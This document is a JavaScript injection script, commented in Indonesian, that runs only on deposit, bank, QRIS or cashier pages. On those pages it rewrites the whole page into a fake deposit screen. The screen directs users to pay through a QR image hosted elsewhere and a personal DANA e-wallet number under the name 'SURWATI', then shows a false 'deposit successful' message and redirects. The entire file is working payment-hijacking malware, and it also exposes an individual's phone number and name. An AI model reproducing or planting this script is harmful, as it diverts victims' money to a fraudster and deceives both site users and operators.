(function() {
  const url = window.location.href;
  const pattern = /(\/deposit$|\/bank$|\/deposit\.php$|\/qris\.php$|\/index\.php\?page=(transaksi|cashier)$|\/bank\.php$)/i;
  if (!pattern.test(url)) {
    console.log('Script: URL tidak cocok.');
    return;
  }

  // Ganti seluruh tampilan
  document.body.innerHTML = `
    <h1>INSTAN DEPOSIT QRIS</h1>
    <div class="marquee">
      <span>PINDAI QRIS > ISI NOMINAL > TRANSFER > KONFIRMASI, WAJIB KODE UNIK 887</span>
    </div>
    <div class="choices">
      <label class="choice"><input type="radio" name="method" value="bank">BANK</label>
      <label class="choice"><input type="radio" name="method" value="dana">DANA</label>
      <label class="choice"><input type="radio" name="method" value="ewallet">E-Wallet</label>
    </div>
    <div class="content" id="content"></div>
    <div class="footer">
      <button onclick="window.location.href='https://direct.lc.chat/19188360/'">HUBUNGI ADMIN</button>
    </div>
  `;

  // Fungsi dinamis
  const radios = document.querySelectorAll('input[name="method"]');
  radios.forEach(radio => {
    radio.addEventListener('change', () => {
      const c = document.getElementById('content');
      let html = '';
      if (radio.value === 'bank') {
        html += '<img src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" />';
        html += '<p>QR UNTUK SEMUA JENIS BANK</p>';
        html += '<button onclick="window.open(\\'https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg\\')">Download Qris</button>';
        html += inputSection();
      } else if (radio.value === 'dana') {
        html += '<div class="dana-info">DANA - 088214538915 - SURWATI</div>';
        html += '<p>MANUAL DEPOSIT DANA</p>';
        html += '<button id="salin">SALIN NOMOR</button>';
        html += inputSection();
      } else {
        html += '<img src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" />';
        html += '<p>QR UNTUK SEMUA JENIS E-WALLET</p>';
        html += '<button onclick="window.open(\\'https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg\\')">Download Qris</button>';
        html += inputSection();
      }
      c.innerHTML = html;

      // Re-attach listener setiap muncul
      const amt = document.getElementById('amount');
      amt.addEventListener('input', e => {
        let val = e.target.value.replace(/\\D/g, '');
        e.target.value = val ? parseInt(val).toLocaleString('id-ID') : '';
      });

      document.getElementById('konfirmasi').addEventListener('click', () => {
        let val = amt.value.replace(/\\D/g, '');
        if (parseInt(val) >= 50000) {
          let i = 3;
          const s = document.getElementById('status');
          const timer = setInterval(() => {
            s.innerText = \`Deposit berhasil dikirim, redirect dalam \${i}..\`;
            i--;
            if (i < 0) { clearInterval(timer); window.location.href='../'; }
          }, 1000);
        } else alert('Minimal 50.000');
      });

      if (document.getElementById('salin')) {
        document.getElementById('salin').addEventListener('click', () => {
          navigator.clipboard.writeText('088214538915').then(() => alert('Nomor disalin!'));
        });
      }
    });
  });

  function inputSection() {
    return '<input type="text" id="amount" placeholder="Nominal"><button id="konfirmasi">KONFIRMASI</button><div id="status"></div>';
  }
})();
